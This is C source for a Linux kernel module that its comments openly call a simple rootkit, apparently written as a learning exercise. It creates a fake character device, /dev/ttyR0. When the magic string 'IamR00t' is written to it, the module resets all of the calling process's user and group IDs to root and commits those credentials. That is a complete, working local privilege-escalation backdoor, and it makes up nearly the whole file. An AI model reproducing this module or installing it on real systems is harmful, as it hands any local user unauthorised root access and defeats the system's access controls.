/*
TODO : 
    Write a working kernel module and provide me with a good report. 
    We will have a meeting to get the details on your work later.
    https://medium.com/@scottc130/writing-your-first-kernel-module-98ae68edf0e  
    https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234

    Here well create a simple rootkit that create a fake drive,
    When we write a MAGIC word in this fake drive ("IamR00t" here), it will grant root access to the current user.
    This is really simple and therefore really simple to counter !
    The goal here was to create a simple lkm and explain it's behaviour

*/

#include <linux/fs.h>  
#include <linux/slab.h>
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <asm/uaccess.h>

// define device & class (ttyR0 & R for Rootkit)
#define  DEVICE_NAME "ttyR0" // device name in /dev
#define  CLASS_NAME  "ttyR"  // class name

 // MAGIC Word to enable rootkit
#define MAGIC "IamR00t"

// _MOD_INFO_
MODULE_LICENSE("GPL");                      // required !!!
MODULE_AUTHOR("Retr0 (Noé Flatreaud)");
MODULE_DESCRIPTION("We don't need sudo !"); 
MODULE_VERSION("0.01"); 

// if Linux version > 3.4.0, value can be accessed using  e.val
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
    #define V(e) e.val
#else
    #define V(e) e
#endif


// ------------------------------------------------------------
// Def
// ------------------------------------------------------------

static int            major; 
static struct class*  root_class  = NULL;
static struct device* root_device = NULL;

// rootkit
static int     __init rootkit__init(void);
static void    __exit rootkit__exit(void);
static int     rootkit__open  (struct inode *inode, struct file *f);
static ssize_t rootkit__read  (struct file *f, char *b, size_t length, loff_t *off);
static ssize_t rootkit__write (struct file *f, const char __user *buffer, size_t length, loff_t *off);

static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = rootkit__open,
  .read = rootkit__read,
  .write = rootkit__write,
};

// ------------------------------------------------------------
// Implements
// ------------------------------------------------------------

// rootkit
static int rootkit__open(struct inode *inode, struct file *f) { return 0; }

static ssize_t rootkit__read(struct file *f, char *b, size_t length, loff_t *off) { return length; }
static ssize_t rootkit__write(struct file *f, const char __user *buffer, size_t length, loff_t *off)
{ 
    // TODO : Whenever we write in the device,
    // It will check whether it is like the MAGIC word 
    // If it is the MAGIC word, it will prepare the credentials and change all credentials to root
    // It will then commit the credentials and return the length(B) of the device data 

    // usefull documentation:
    //      https://github.com/torvalds/linux/blob/master/kernel/cred.c
    //      https://www.kernel.org/doc/html/latest/security/credentials.html

    // 1. malloc data w\ length (for comparison)
    // 2. copy data from file (content of device)
    // 3. compare data with MAGIC number
    //    * If (same) then :
    //      31. prepare credentials
    //      32. reset all credentials to root (0)
    //      33. commit new credentals
    // 4. free data
    // 5. return length

    struct cred *_cred;
    char *data = (char *)kmalloc(length+1,GFP_KERNEL); // malloc data

    // check null
    if (data)
    {
        copy_from_user (data, buffer, length); // copy data from user

        if (memcmp(data, MAGIC, 7) == 0) // if we have the MAGIC Word in the file
        {
            if ((_cred = prepare_creds ()) == NULL) 
            {
                // If we cannot prepare the credentials, return 0 and alert kernel
                printk ("R00t: Cannot prepare credentials\n");
                return 0;
            }

            // exact same idea than syscall hijacking : we just overwrite the credentials to match root
            // https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/

            printk ("R00t: Well said !\n");
            V(_cred->uid) = V(_cred->gid) =  0;
            V(_cred->euid) = V(_cred->egid) = 0;
            V(_cred->suid) = V(_cred->sgid) = 0;
            V(_cred->fsuid) = V(_cred->fsgid) = 0;
            commit_creds (_cred);                    // commit all the new credentials
        }

        kfree(data); // free data (~malloc)
    }
    else
    {
        // if null, alert kernel
        printk(KERN_ALERT "R00t: Unable to allocate memory");
    }
        
    return length; // If success, return length
}

static int __init rootkit__init(void)
{
    // TODO : 
    // To load the rootkit, we need to create a fake device with the handler in it.
    // Here we will use a magic word stored in the device to trigger the rootkit
    // To create the device, we first have to register the character device,
    // register a new device class and finally create the device from both the clss and the char_device
    //
    // useful documentation : 
    //
    //      https://linux-kernel-labs.github.io/refs/heads/master/labs/device_drivers.html
    //      https://manpages.debian.org/experimental/linux-manual-4.11/__register_chrdev.9.en.html
    //      https://www.win.tue.nl/~aeb/linux/lk/lk-11.html

    // 1. Register char device (+ERROR check)
    // 2. Register device class (+ERROR check)
    // 3. Create device (+ERROR check)

    // register character device
    if ((major = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
    {
        // TODO : if we have and error, alert kernel and return major number 
        printk(KERN_ALERT "R00t failed to register his major num\n");
        return major;
    }

    // Register the device class
    root_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(root_class))
    {
        // TODO : if we have an error, unregister device , alert kernel and return error
        unregister_chrdev(major, DEVICE_NAME);
        printk(KERN_ALERT "R00t: Failed to register device class\n");
        return PTR_ERR(root_class); 
    }

    // Create device
    root_device = device_create(root_class, NULL, MKDEV(major, 0), NULL, DEVICE_NAME); // create new device
    if (IS_ERR(root_device))
    {
        // TODO : if we have an error, destroy class, unregister device, alert kernel and return error 
       class_destroy(root_class);
       unregister_chrdev(major, DEVICE_NAME);
       printk(KERN_ALERT "R00t: Failed to create device\n");
       return PTR_ERR(root_device);
    }

    // if everything is fine, alert kernel (with major num) and return 0
    printk ("R00t: LKM loaded ! [%d]\n", major);
    return 0;
}
static void __exit rootkit__exit(void) 
{
    // TODO : Destroy device when exitted
    
    // 1. Destroy device
    // 2. unregister class
    // 3. destroy class
    // 4. undregister character device

    device_destroy(root_class, MKDEV(major, 0));
    class_unregister(root_class);                     
    class_destroy(root_class);                        
    unregister_chrdev(major, DEVICE_NAME);     

    printk("R00t: Bye World!\n");
}

// lkm
module_init(rootkit__init);
module_exit(rootkit__exit);